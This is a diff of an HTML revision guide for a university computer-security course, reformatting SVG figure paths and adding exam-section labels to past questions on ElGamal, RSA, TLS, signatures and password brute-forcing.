-L 524.126076 89.952 
-L 518.926076 92.552 
-L 518.926076 87.352 
+<path clip-path="url(#fig-9-pba7d367ae1)" d="M 518.926076 87.352
+L 524.126076 89.952
+L 518.926076 92.552
+L 518.926076 87.352
 z
 " style="fill: #aa3d46; stroke: #aa3d46; stroke-width: 1.3; stroke-linecap: round"></path>
 </g>
 <g id="fig-9-patch_4">
-<path clip-path="url(#fig-9-pba7d367ae1)" d="M 525.577327 124.14 
-Q 407.608904 124.14 291.093924 124.14 
+<path clip-path="url(#fig-9-pba7d367ae1)" d="M 525.577327 124.14
+Q 407.608904 124.14 291.093924 124.14
 " style="fill: none; stroke: #244a75; stroke-width: 1.3; stroke-linecap: round"></path>
-<path clip-path="url(#fig-9-pba7d367ae1)" d="M 296.293924 126.74 
-L 291.093924 124.14 
-L 296.293924 121.54 
-L 296.293924 126.74 
+<path clip-path="url(#fig-9-pba7d367ae1)" d="M 296.293924 126.74
+L 291.093924 124.14
+L 296.293924 121.54
+L 296.293924 126.74
 z
 " style="fill: #244a75; stroke: #244a75; stroke-width: 1.3; stroke-linecap: round"></path>
 </g>
 <g id="fig-9-patch_5">
-<path clip-path="url(#fig-9-pba7d367ae1)" d="M 285.637327 158.328 
-Q 167.668904 158.328 51.153924 158.328 
+<path clip-path="url(#fig-9-pba7d367ae1)" d="M 285.637327 158.328
+Q 167.668904 158.328 51.153924 158.328
 " style="fill: none; stroke: #aa3d46; stroke-width: 1.3; stroke-linecap: round"></path>
-<path clip-path="url(#fig-9-pba7d367ae1)" d="M 56.353924 160.928 
-L 51.153924 158.328 
-L 56.353924 155.728 
-L 56.353924 160.928 
+<path clip-path="url(#fig-9-pba7d367ae1)" d="M 56.353924 160.928
+L 51.153924 158.328
+L 56.353924 155.728
+L 56.353924 160.928
 z
 " style="fill: #aa3d46; stroke: #aa3d46; stroke-width: 1.3; stroke-linecap: round"></path>
 </g>
 <g id="fig-9-patch_6">
-<path clip-path="url(#fig-9-pba7d367ae1)" d="M 49.702673 192.516 
-Q 167.671096 192.516 284.186076 192.516 
+<path clip-path="url(#fig-9-pba7d367ae1)" d="M 49.702673 192.516
+Q 167.671096 192.516 284.186076 192.516
 " style="fill: none; stroke: #244a75; stroke-width: 1.3; stroke-linecap: round"></path>
-<path clip-path="url(#fig-9-pba7d367ae1)" d="M 278.986076 189.916 
-L 284.186076 192.516 
-L 278.986076 195.116 
-L 278.986076 189.916 
+<path clip-path="url(#fig-9-pba7d367ae1)" d="M 278.986076 189.916
+L 284.186076 192.516
+L 278.986076 195.116
+L 278.986076 189.916
 z
 " style="fill: #244a75; stroke: #244a75; stroke-width: 1.3; stroke-linecap: round"></path>
 </g>
 <g id="fig-9-patch_7">
-<path clip-path="url(#fig-9-pba7d367ae1)" d="M 289.642673 226.704 
-Q 407.611096 226.704 524.126076 226.704 
+<path clip-path="url(#fig-9-pba7d367ae1)" d="M 289.642673 226.704
+Q 407.611096 226.704 524.126076 226.704
 " style="fill: none; stroke: #aa3d46; stroke-width: 1.3; stroke-linecap: round"></path>
-<path clip-path="url(#fig-9-pba7d367ae1)" d="M 518.926076 224.104 
-L 524.126076 226.704 
-L 518.926076 229.304 
-L 518.926076 224.104 
+<path clip-path="url(#fig-9-pba7d367ae1)" d="M 518.926076 224.104
+L 524.126076 226.704
+L 518.926076 229.304
+L 518.926076 224.104
 z
 " style="fill: #aa3d46; stroke: #aa3d46; stroke-width: 1.3; stroke-linecap: round"></path>
 </g>
 <g id="fig-9-line2d_1">
-<path clip-path="url(#fig-9-pba7d367ae1)" d="M 47.7 258.12 
-L 47.7 39.132 
+<path clip-path="url(#fig-9-pba7d367ae1)" d="M 47.7 258.12
+L 47.7 39.132
 " style="fill: none; stroke-dasharray: 3.7,1.6; stroke-dashoffset: 0; stroke: #bac8d5"></path>
 </g>
 <g id="fig-9-line2d_2">
-<path clip-path="url(#fig-9-pba7d367ae1)" d="M 287.64 258.12 
-L 287.64 39.132 
+<path clip-path="url(#fig-9-pba7d367ae1)" d="M 287.64 258.12
+L 287.64 39.132
 " style="fill: none; stroke-dasharray: 3.7,1.6; stroke-dashoffset: 0; stroke: #bac8d5"></path>
 </g>
 <g id="fig-9-line2d_3">
-<path clip-path="url(#fig-9-pba7d367ae1)" d="M 527.58 258.12 
-L 527.58 39.132 
+<path clip-path="url(#fig-9-pba7d367ae1)" d="M 527.58 258.12
+L 527.58 39.132
 " style="fill: none; stroke-dasharray: 3.7,1.6; stroke-dashoffset: 0; stroke: #bac8d5"></path>
 </g>
 <g id="fig-9-text_1">
@@ -2973,7 +2973,7 @@ L 527.58 39.132
 <p><a id="s05"></a></p>
 <section class="question"><h3>S05 · 2023–24 · Q7(a)</h3>
 <p><strong>Numerical ElGamal; IND-CPA and non-malleability · 15 marks</strong></p>
-<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=9">root question PDF, page 9</a>. Sitting date: 06 September 2025.</p>
+<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=9">root question PDF, page 9</a>. Sitting date: 06 September 2025. Printed Section B.</p>
 <blockquote>
 <p><strong>Question summary:</strong> For ElGamal with p=353, g=3, Bob’s private key b=233, Alice’s message M=123 and random r=97, compute Bob’s public key and the ciphertext, and show decryption step by step. Is the scheme IND-CPA secure and non-malleable? Justify.</p>
 </blockquote>
@@ -2996,7 +2996,7 @@ M=265\cdot139\bmod353=123.
 <p><a id="s06"></a></p>
 </section><section class="question"><h3>S06 · 2023–24 · Q7(b)</h3>
 <p><strong>RSA correctness proof · 10 marks</strong></p>
-<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=9">root question PDF, page 9</a>. Sitting date: 06 September 2025.</p>
+<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=9">root question PDF, page 9</a>. Sitting date: 06 September 2025. Printed Section B.</p>
 <blockquote>
 <p><strong>Question summary:</strong> Prove mathematically that RSA decryption recovers the original message, using the necessary number-theory results.</p>
 </blockquote>
@@ -3013,7 +3013,7 @@ M^{ed}=M\left(M^{p-1}\right)^{t(q-1)}\equiv M\pmod p.
 <p><a id="s07"></a></p>
 </section><section class="question"><h3>S07 · 2023–24 · Q7(c)</h3>
 <p><strong>RSA signing/verifying; security of separately sending ciphertext and signature · 10 marks</strong></p>
-<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=9">root question PDF, page 9</a>. Sitting date: 06 September 2025.</p>
+<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=9">root question PDF, page 9</a>. Sitting date: 06 September 2025. Printed Section B.</p>
 <blockquote>
 <p><strong>Question summary:</strong> Define RSA signature creation and verification using Sign(d,M) and Verify(e,N,M,sig). Alice encrypts M with Bob’s RSA public key and signs M with her own private key. Can she securely send both ciphertext and signature together? Justify cryptographically.</p>
 </blockquote>
@@ -3045,96 +3045,96 @@ M^{ed}=M\left(M^{p-1}\right)^{t(q-1)}\equiv M\pmod p.
 </defs>
 <g id="fig-10-figure_1">
 <g id="fig-10-patch_1">
-<path d="M 0 155.88 
-L 575.28 155.88 
-L 575.28 0 
-L 0 0 
+<path d="M 0 155.88
+L 575.28 155.88
+L 575.28 0
+L 0 0
 z
 " style="fill: #ffffff"></path>
 </g>
 <g id="fig-10-axes_1">
 <g id="fig-10-patch_2">
-<path clip-path="url(#fig-10-p49a5b14950)" d="M 10.872 96.2352 
-L 126.378 96.2352 
-Q 130.284 96.2352 130.284 92.3544 
-L 130.284 60.7536 
-Q 130.284 56.8728 126.378 56.8728 
-L 10.872 56.8728 
-Q 6.966 56.8728 6.966 60.7536 
-L 6.966 92.3544 
-Q 6.966 96.2352 10.872 96.2352 
+<path clip-path="url(#fig-10-p49a5b14950)" d="M 10.872 96.2352
+L 126.378 96.2352
+Q 130.284 96.2352 130.284 92.3544
+L 130.284 60.7536
+Q 130.284 56.8728 126.378 56.8728
+L 10.872 56.8728
+Q 6.966 56.8728 6.966 60.7536
+L 6.966 92.3544
+Q 6.966 96.2352 10.872 96.2352
 z
 " style="fill: #244a75; fill-opacity: 0.05098; stroke: #244a75; stroke-width: 1.2; stroke-linejoin: miter"></path>
 </g>
 <g id="fig-10-patch_3">
-<path clip-path="url(#fig-10-p49a5b14950)" d="M 150.372 96.2352 
-L 265.878 96.2352 
-Q 269.784 96.2352 269.784 92.3544 
-L 269.784 60.7536 
-Q 269.784 56.8728 265.878 56.8728 
-L 150.372 56.8728 
-Q 146.466 56.8728 146.466 60.7536 
-L 146.466 92.3544 
-Q 146.466 96.2352 150.372 96.2352 
+<path clip-path="url(#fig-10-p49a5b14950)" d="M 150.372 96.2352
+L 265.878 96.2352
+Q 269.784 96.2352 269.784 92.3544
+L 269.784 60.7536
+Q 269.784 56.8728 265.878 56.8728
+L 150.372 56.8728
+Q 146.466 56.8728 146.466 60.7536
+L 146.466 92.3544
+Q 146.466 96.2352 150.372 96.2352
 z
 " style="fill: #244a75; fill-opacity: 0.05098; stroke: #244a75; stroke-width: 1.2; stroke-linejoin: miter"></path>
 </g>
 <g id="fig-10-patch_4">
-<path clip-path="url(#fig-10-p49a5b14950)" d="M 289.872 96.2352 
-L 405.378 96.2352 
-Q 409.284 96.2352 409.284 92.3544 
-L 409.284 60.7536 
-Q 409.284 56.8728 405.378 56.8728 
-L 289.872 56.8728 
-Q 285.966 56.8728 285.966 60.7536 
-L 285.966 92.3544 
-Q 285.966 96.2352 289.872 96.2352 
+<path clip-path="url(#fig-10-p49a5b14950)" d="M 289.872 96.2352
+L 405.378 96.2352
+Q 409.284 96.2352 409.284 92.3544
+L 409.284 60.7536
+Q 409.284 56.8728 405.378 56.8728
+L 289.872 56.8728
+Q 285.966 56.8728 285.966 60.7536
+L 285.966 92.3544
+Q 285.966 96.2352 289.872 96.2352
 z
 " style="fill: #244a75; fill-opacity: 0.05098; stroke: #244a75; stroke-width: 1.2; stroke-linejoin: miter"></path>
 </g>
 <g id="fig-10-patch_5">
-<path clip-path="url(#fig-10-p49a5b14950)" d="M 429.372 96.2352 
-L 544.878 96.2352 
-Q 548.784 96.2352 548.784 92.3544 
-L 548.784 60.7536 
-Q 548.784 56.8728 544.878 56.8728 
-L 429.372 56.8728 
-Q 425.466 56.8728 425.466 60.7536 
-L 425.466 92.3544 
-Q 425.466 96.2352 429.372 96.2352 
+<path clip-path="url(#fig-10-p49a5b14950)" d="M 429.372 96.2352
+L 544.878 96.2352
+Q 548.784 96.2352 548.784 92.3544
+L 548.784 60.7536
+Q 548.784 56.8728 544.878 56.8728
+L 429.372 56.8728
+Q 425.466 56.8728 425.466 60.7536
+L 425.466 92.3544
+Q 425.466 96.2352 429.372 96.2352
 z
 " style="fill: #244a75; fill-opacity: 0.05098; stroke: #244a75; stroke-width: 1.2; stroke-linejoin: miter"></path>
 </g>
 <g id="fig-10-patch_6">
-<path clip-path="url(#fig-10-p49a5b14950)" d="M 133.399182 76.2768 
-Q 138.375286 76.2768 141.897945 76.2768 
+<path clip-path="url(#fig-10-p49a5b14950)" d="M 133.399182 76.2768
+Q 138.375286 76.2768 141.897945 76.2768
 " style="fill: none; stroke: #244a75; stroke-width: 1.3; stroke-linecap: round"></path>
-<path clip-path="url(#fig-10-p49a5b14950)" d="M 136.697945 73.6768 
-L 141.897945 76.2768 
-L 136.697945 78.8768 
-L 136.697945 73.6768 
+<path clip-path="url(#fig-10-p49a5b14950)" d="M 136.697945 73.6768
+L 141.897945 76.2768
+L 136.697945 78.8768
+L 136.697945 73.6768
 z
 " style="fill: #244a75; stroke: #244a75; stroke-width: 1.3; stroke-linecap: round"></path>
 </g>
 <g id="fig-10-patch_7">
-<path clip-path="url(#fig-10-p49a5b14950)" d="M 272.899182 76.2768 
-Q 277.875286 76.2768 281.397945 76.2768 
+<path clip-path="url(#fig-10-p49a5b14950)" d="M 272.899182 76.2768
+Q 277.875286 76.2768 281.397945 76.2768
 " style="fill: none; stroke: #244a75; stroke-width: 1.3; stroke-linecap: round"></path>
-<path clip-path="url(#fig-10-p49a5b14950)" d="M 276.197945 73.6768 
-L 281.397945 76.2768 
-L 276.197945 78.8768 
-L 276.197945 73.6768 
+<path clip-path="url(#fig-10-p49a5b14950)" d="M 276.197945 73.6768
+L 281.397945 76.2768
+L 276.197945 78.8768
+L 276.197945 73.6768
 z
 " style="fill: #244a75; stroke: #244a75; stroke-width: 1.3; stroke-linecap: round"></path>
 </g>
 <g id="fig-10-patch_8">
-<path clip-path="url(#fig-10-p49a5b14950)" d="M 412.399182 76.2768 
-Q 417.375286 76.2768 420.897945 76.2768 
+<path clip-path="url(#fig-10-p49a5b14950)" d="M 412.399182 76.2768
+Q 417.375286 76.2768 420.897945 76.2768
 " style="fill: none; stroke: #244a75; stroke-width: 1.3; stroke-linecap: round"></path>
-<path clip-path="url(#fig-10-p49a5b14950)" d="M 415.697945 73.6768 
-L 420.897945 76.2768 
-L 415.697945 78.8768 
-L 415.697945 73.6768 
+<path clip-path="url(#fig-10-p49a5b14950)" d="M 415.697945 73.6768
+L 420.897945 76.2768
+L 415.697945 78.8768
+L 415.697945 73.6768
 z
 " style="fill: #244a75; stroke: #244a75; stroke-width: 1.3; stroke-linecap: round"></path>
 </g>
@@ -3165,7 +3165,7 @@ z
 <p><a id="s13"></a></p>
 </section><section class="question"><h3>S13 · 2023–24 · Q4(c)</h3>
 <p><strong>TLS handshake authentication, directional keys and authenticated records · 15 marks</strong></p>
-<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=6">root question PDF, page 6</a>. Sitting date: 06 September 2025.</p>
+<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=6">root question PDF, page 6</a>. Sitting date: 06 September 2025. Printed Section A.</p>
 <blockquote>
 <p><strong>Question summary:</strong> For the supplied TLS handshake: (i) why can a MITM not exploit unencrypted/unauthenticated ClientHello and ServerHello, in both the DH and RSA cases? (ii) Why is using one shared encryption key and one shared integrity key for both directions a bad idea? (iii) After ChangeCipherSpec, what vulnerability remains in the simplified protocol, and how would you fix it?</p>
 </blockquote>
@@ -3183,7 +3183,7 @@ T=\operatorname{MAC}_{K_{\mathrm{dir}}}\!\left(\mathrm{seq}\parallel\mathrm{type
 <p><a id="s34"></a></p>
 </section><section class="question"><h3>S34 · 2021–22 · Q3(d)</h3>
 <p><strong>Symmetric/public-key comparison; key roles in signing versus encryption · 10 marks</strong></p>
-<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=16">root question PDF, page 16</a>. Sitting date: 30 October 2023.</p>
+<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=16">root question PDF, page 16</a>. Sitting date: 30 October 2023. Printed Section A.</p>
 <blockquote>
 <p><strong>Question summary:</strong> Compare symmetric and public-key cryptography. Explain how the roles of public and private keys in signatures differ from their roles in public-key encryption.</p>
 </blockquote>
@@ -3234,7 +3234,7 @@ T=\operatorname{MAC}_{K_{\mathrm{dir}}}\!\left(\mathrm{seq}\parallel\mathrm{type
 <p><a id="s43"></a></p>
 </section><section class="question"><h3>S43 · 2020–21 · Q6(b)</h3>
 <p><strong>ElGamal signature algorithm and reuse of secret k · 10 marks</strong></p>
-<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=20">root question PDF, page 20</a>. Sitting date: 25 September 2022.</p>
+<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=20">root question PDF, page 20</a>. Sitting date: 25 September 2022. Printed Section B.</p>
 <blockquote>
 <p><strong>Question summary:</strong> Explain the ElGamal signature scheme. Why must the same random k not be used for two signatures?</p>
 </blockquote>
@@ -3257,7 +3257,7 @@ T=\operatorname{MAC}_{K_{\mathrm{dir}}}\!\left(\mathrm{seq}\parallel\mathrm{type
 <p><a id="s48"></a></p>
 </section><section class="question"><h3>S48 · 2019–20 · Q1(a)</h3>
 <p><strong>Digital signatures and non-repudiation · 12 marks</strong></p>
-<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=22">root question PDF, page 22</a>. Sitting date: 07 September 2021.</p>
+<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=22">root question PDF, page 22</a>. Sitting date: 07 September 2021. Printed Section A.</p>
 <blockquote>
 <p><strong>Question summary:</strong> Explain, with a figure, how digital signatures ensure non-repudiation.</p>
 </blockquote>
@@ -3286,96 +3286,96 @@ Verifier:   validate identity/key binding; Verify(PKA,context||M,s)
 </defs>
 <g id="fig-11-figure_1">
 <g id="fig-11-patch_1">
-<path d="M 0 155.88 
-L 575.28 155.88 
-L 575.28 0 
-L 0 0 
+<path d="M 0 155.88
+L 575.28 155.88
+L 575.28 0
+L 0 0
 z
 " style="fill: #ffffff"></path>
 </g>
 <g id="fig-11-axes_1">
 <g id="fig-11-patch_2">
-<path clip-path="url(#fig-11-p49a5b14950)" d="M 10.872 96.2352 
-L 126.378 96.2352 
-Q 130.284 96.2352 130.284 92.3544 
-L 130.284 60.7536 
-Q 130.284 56.8728 126.378 56.8728 
-L 10.872 56.8728 
-Q 6.966 56.8728 6.966 60.7536 
-L 6.966 92.3544 
-Q 6.966 96.2352 10.872 96.2352 
+<path clip-path="url(#fig-11-p49a5b14950)" d="M 10.872 96.2352
+L 126.378 96.2352
+Q 130.284 96.2352 130.284 92.3544
+L 130.284 60.7536
+Q 130.284 56.8728 126.378 56.8728
+L 10.872 56.8728
+Q 6.966 56.8728 6.966 60.7536
+L 6.966 92.3544
+Q 6.966 96.2352 10.872 96.2352
 z
 " style="fill: #244a75; fill-opacity: 0.05098; stroke: #244a75; stroke-width: 1.2; stroke-linejoin: miter"></path>
 </g>
 <g id="fig-11-patch_3">
-<path clip-path="url(#fig-11-p49a5b14950)" d="M 150.372 96.2352 
-L 265.878 96.2352 
-Q 269.784 96.2352 269.784 92.3544 
-L 269.784 60.7536 
-Q 269.784 56.8728 265.878 56.8728 
-L 150.372 56.8728 
-Q 146.466 56.8728 146.466 60.7536 
-L 146.466 92.3544 
-Q 146.466 96.2352 150.372 96.2352 
+<path clip-path="url(#fig-11-p49a5b14950)" d="M 150.372 96.2352
+L 265.878 96.2352
+Q 269.784 96.2352 269.784 92.3544
+L 269.784 60.7536
+Q 269.784 56.8728 265.878 56.8728
+L 150.372 56.8728
+Q 146.466 56.8728 146.466 60.7536
+L 146.466 92.3544
+Q 146.466 96.2352 150.372 96.2352
 z
 " style="fill: #244a75; fill-opacity: 0.05098; stroke: #244a75; stroke-width: 1.2; stroke-linejoin: miter"></path>
 </g>
 <g id="fig-11-patch_4">
-<path clip-path="url(#fig-11-p49a5b14950)" d="M 289.872 96.2352 
-L 405.378 96.2352 
-Q 409.284 96.2352 409.284 92.3544 
-L 409.284 60.7536 
-Q 409.284 56.8728 405.378 56.8728 
-L 289.872 56.8728 
-Q 285.966 56.8728 285.966 60.7536 
-L 285.966 92.3544 
-Q 285.966 96.2352 289.872 96.2352 
+<path clip-path="url(#fig-11-p49a5b14950)" d="M 289.872 96.2352
+L 405.378 96.2352
+Q 409.284 96.2352 409.284 92.3544
+L 409.284 60.7536
+Q 409.284 56.8728 405.378 56.8728
+L 289.872 56.8728
+Q 285.966 56.8728 285.966 60.7536
+L 285.966 92.3544
+Q 285.966 96.2352 289.872 96.2352
 z
 " style="fill: #244a75; fill-opacity: 0.05098; stroke: #244a75; stroke-width: 1.2; stroke-linejoin: miter"></path>
 </g>
 <g id="fig-11-patch_5">
-<path clip-path="url(#fig-11-p49a5b14950)" d="M 429.372 96.2352 
-L 544.878 96.2352 
-Q 548.784 96.2352 548.784 92.3544 
-L 548.784 60.7536 
-Q 548.784 56.8728 544.878 56.8728 
-L 429.372 56.8728 
-Q 425.466 56.8728 425.466 60.7536 
-L 425.466 92.3544 
-Q 425.466 96.2352 429.372 96.2352 
+<path clip-path="url(#fig-11-p49a5b14950)" d="M 429.372 96.2352
+L 544.878 96.2352
+Q 548.784 96.2352 548.784 92.3544
+L 548.784 60.7536
+Q 548.784 56.8728 544.878 56.8728
+L 429.372 56.8728
+Q 425.466 56.8728 425.466 60.7536
+L 425.466 92.3544
+Q 425.466 96.2352 429.372 96.2352
 z
 " style="fill: #244a75; fill-opacity: 0.05098; stroke: #244a75; stroke-width: 1.2; stroke-linejoin: miter"></path>
 </g>
 <g id="fig-11-patch_6">
-<path clip-path="url(#fig-11-p49a5b14950)" d="M 133.399182 76.2768 
-Q 138.375286 76.2768 141.897945 76.2768 
+<path clip-path="url(#fig-11-p49a5b14950)" d="M 133.399182 76.2768
+Q 138.375286 76.2768 141.897945 76.2768
 " style="fill: none; stroke: #244a75; stroke-width: 1.3; stroke-linecap: round"></path>
-<path clip-path="url(#fig-11-p49a5b14950)" d="M 136.697945 73.6768 
-L 141.897945 76.2768 
-L 136.697945 78.8768 
-L 136.697945 73.6768 
+<path clip-path="url(#fig-11-p49a5b14950)" d="M 136.697945 73.6768
+L 141.897945 76.2768
+L 136.697945 78.8768
+L 136.697945 73.6768
 z
 " style="fill: #244a75; stroke: #244a75; stroke-width: 1.3; stroke-linecap: round"></path>
 </g>
 <g id="fig-11-patch_7">
-<path clip-path="url(#fig-11-p49a5b14950)" d="M 272.899182 76.2768 
-Q 277.875286 76.2768 281.397945 76.2768 
+<path clip-path="url(#fig-11-p49a5b14950)" d="M 272.899182 76.2768
+Q 277.875286 76.2768 281.397945 76.2768
 " style="fill: none; stroke: #244a75; stroke-width: 1.3; stroke-linecap: round"></path>
-<path clip-path="url(#fig-11-p49a5b14950)" d="M 276.197945 73.6768 
-L 281.397945 76.2768 
-L 276.197945 78.8768 
-L 276.197945 73.6768 
+<path clip-path="url(#fig-11-p49a5b14950)" d="M 276.197945 73.6768
+L 281.397945 76.2768
+L 276.197945 78.8768
+L 276.197945 73.6768
 z
 " style="fill: #244a75; stroke: #244a75; stroke-width: 1.3; stroke-linecap: round"></path>
 </g>
 <g id="fig-11-patch_8">
-<path clip-path="url(#fig-11-p49a5b14950)" d="M 412.399182 76.2768 
-Q 417.375286 76.2768 420.897945 76.2768 
+<path clip-path="url(#fig-11-p49a5b14950)" d="M 412.399182 76.2768
+Q 417.375286 76.2768 420.897945 76.2768
 " style="fill: none; stroke: #244a75; stroke-width: 1.3; stroke-linecap: round"></path>
-<path clip-path="url(#fig-11-p49a5b14950)" d="M 415.697945 73.6768 
-L 420.897945 76.2768 
-L 415.697945 78.8768 
-L 415.697945 73.6768 
+<path clip-path="url(#fig-11-p49a5b14950)" d="M 415.697945 73.6768
+L 420.897945 76.2768
+L 415.697945 78.8768
+L 415.697945 73.6768
 z
 " style="fill: #244a75; stroke: #244a75; stroke-width: 1.3; stroke-linecap: round"></path>
 </g>
@@ -3409,7 +3409,7 @@ z
 <p><a id="s53"></a></p>
 </section><section class="question"><h3>S53 · 2019–20 · Q7(a)</h3>
 <p><strong>Euler totient/theorem; modular inverse · 8 marks</strong></p>
-<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=24">root question PDF, page 24</a>. Sitting date: 07 September 2021.</p>
+<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=24">root question PDF, page 24</a>. Sitting date: 07 September 2021. Printed Section B.</p>
 <blockquote>
 <p><strong>Question summary:</strong> Define Euler’s totient function and Euler’s theorem, and explain computing a modular inverse using Euler’s theorem.</p>
 </blockquote>
@@ -3424,7 +3424,7 @@ z
 <p><a id="s54"></a></p>
 </section><section class="question"><h3>S54 · 2019–20 · Q7(b)</h3>
 <p><strong>Modular equations and fast exponentiation · 12 marks</strong></p>
-<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=24">root question PDF, page 24</a>. Sitting date: 07 September 2021.</p>
+<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=24">root question PDF, page 24</a>. Sitting date: 07 September 2021. Printed Section B.</p>
 <blockquote>
 <p><strong>Question summary:</strong> Solve (i) x^8 ≡ 9 (mod 13), (ii) x² ≡ 2 (mod 13), and compute 3^128 mod 7. A modular-exponentiation table modulo 13 is supplied.</p>
 </blockquote>
@@ -3505,7 +3505,7 @@ z
 <p><a id="s55"></a></p>
 </section><section class="question"><h3>S55 · 2019–20 · Q7(c)</h3>
 <p><strong>RSA validity, repeated totients and encryption · 15 marks</strong></p>
-<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=24">root question PDF, page 24</a>. Sitting date: 07 September 2021.</p>
+<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=24">root question PDF, page 24</a>. Sitting date: 07 September 2021. Printed Section B.</p>
 <blockquote>
 <p><strong>Question summary:</strong> System A: p=83, q=101, e=3, d=5467. System B: p=17, q=11, e=7, d=23. For both compute φ(n) and φ(φ(n)), and explain validity. For system B encrypt plaintext M=3.</p>
 </blockquote>
@@ -3527,7 +3527,7 @@ C=3^7\bmod187=2187\bmod187=130.
 <p><a id="s56"></a></p>
 </section><section class="question"><h3>S56 · 2019–20 · Q8(a)</h3>
 <p><strong>ElGamal encryption proof; birthday attack on signatures · 20 marks</strong></p>
-<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=24">root question PDF, page 24</a>. Sitting date: 07 September 2021.</p>
+<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=24">root question PDF, page 24</a>. Sitting date: 07 September 2021. Printed Section B.</p>
 <blockquote>
 <p><strong>Question summary:</strong> Describe ElGamal encryption/decryption and prove decryption correctness. Give an illustrative example showing that digital signatures can be vulnerable to a birthday attack.</p>
 </blockquote>
@@ -3546,7 +3546,7 @@ C_2(C_1^x)^{-1}=Mg^{xr}g^{-rx}=M.
 <p><a id="s59"></a></p>
 </section><section class="question"><h3>S59 · 2018–19 · Q1(d)</h3>
 <p><strong>Risks of signing an apparently random string · 8 marks</strong></p>
-<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=26">root question PDF, page 26</a>. Sitting date: 24 October 2019.</p>
+<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=26">root question PDF, page 26</a>. Sitting date: 24 October 2019. Printed Section A.</p>
 <blockquote>
 <p><strong>Question summary:</strong> Explain the risks if Bob agrees to sign a seemingly random string with his private key.</p>
 </blockquote>
@@ -3563,7 +3563,7 @@ C_2(C_1^x)^{-1}=Mg^{xr}g^{-rx}=M.
 <p><a id="s12"></a></p>
 <section class="question"><h3>S12 · 2023–24 · Q1(c)</h3>
 <p><strong>Untrusted key bundled with its own signature; attacker positions · 15 marks</strong></p>
-<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=2">root question PDF, page 2</a>. Sitting date: 06 September 2025.</p>
+<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=2">root question PDF, page 2</a>. Sitting date: 06 September 2025. Printed Section A.</p>
 <blockquote>
 <p><strong>Question summary:</strong> ARTBot broadcasts to learn CSBot’s phone number. CSBot replies with its number, public key, and a signature on the number. ARTBot verifies using that supplied key and caches the result. Explain how to poison the cached number as (i) an on-path attacker, (ii) a MITM attacker and (iii) an off-path attacker. Analyze a possible defense.</p>
 </blockquote>
@@ -3576,7 +3576,7 @@ C_2(C_1^x)^{-1}=Mg^{xr}g^{-rx}=M.
 <p><a id="s25"></a></p>
 </section><section class="question"><h3>S25 · 2022–23 · Q2(a)</h3>
 <p><strong>Brute-force throughput under a password-expiration policy · 12 marks</strong></p>
-<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=11">root question PDF, page 11</a>. Sitting date: 18 April 2024.</p>
+<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=11">root question PDF, page 11</a>. Sitting date: 18 April 2024. Printed Section A.</p>
 <blockquote>
 <p><strong>Question summary:</strong> A password policy requires uppercase, lowercase, numeric and special characters, minimum length 10, with monthly password changes. Estimate the minimum guesses per second needed to crack a credential, showing the calculations.</p>
 </blockquote>
@@ -3598,7 +3598,7 @@ C_2(C_1^x)^{-1}=Mg^{xr}g^{-rx}=M.
 <p><a id="s39"></a></p>
 </section><section class="question"><h3>S39 · 2021–22 · Q7(c)</h3>
 <p><strong>Self-signed SSL certificate and server authentication · 11 marks</strong></p>
-<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=17">root question PDF, page 17</a>. Sitting date: 30 October 2023.</p>
+<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=17">root question PDF, page 17</a>. Sitting date: 30 October 2023. Printed Section B.</p>
 <blockquote>
 <p><strong>Question summary:</strong> Why is buying from a shopping website that uses a self-signed SSL certificate a bad idea?</p>
 </blockquote>
@@ -3609,7 +3609,7 @@ C_2(C_1^x)^{-1}=Mg^{xr}g^{-rx}=M.
 <p><a id="s49"></a></p>
 </section><section class="question"><h3>S49 · 2019–20 · Q1(c)</h3>
 <p><strong>Public security questions and password-reset account takeover · 11 marks</strong></p>
-<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=22">root question PDF, page 22</a>. Sitting date: 07 September 2021.</p>
+<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=22">root question PDF, page 22</a>. Sitting date: 07 September 2021. Printed Section A.</p>
 <blockquote>
 <p><strong>Question summary:</strong> Attackers reset Sarah Palin’s email password using publicly available personal information such as birthday, ZIP code and security-question answers. Identify the attack and evaluate the security of this password-reset feature.</p>
 </blockquote>
@@ -3620,7 +3620,7 @@ C_2(C_1^x)^{-1}=Mg^{xr}g^{-rx}=M.
 <p><a id="s50"></a></p>
 </section><section class="question"><h3>S50 · 2019–20 · Q2(b)</h3>
 <p><strong>Password-space size and average brute-force time · 12 marks</strong></p>
-<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=22">root question PDF, page 22</a>. Sitting date: 07 September 2021.</p>
+<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=22">root question PDF, page 22</a>. Sitting date: 07 September 2021. Printed Section A.</p>
 <blockquote>
 <p><strong>Question summary:</strong> How many 10-character passwords can be made from all 128 ASCII characters? If an attacker tests one candidate per microsecond, how long does guessing take on average?</p>
 </blockquote>
@@ -3638,7 +3638,7 @@ C_2(C_1^x)^{-1}=Mg^{xr}g^{-rx}=M.
 <p><a id="s58"></a></p>
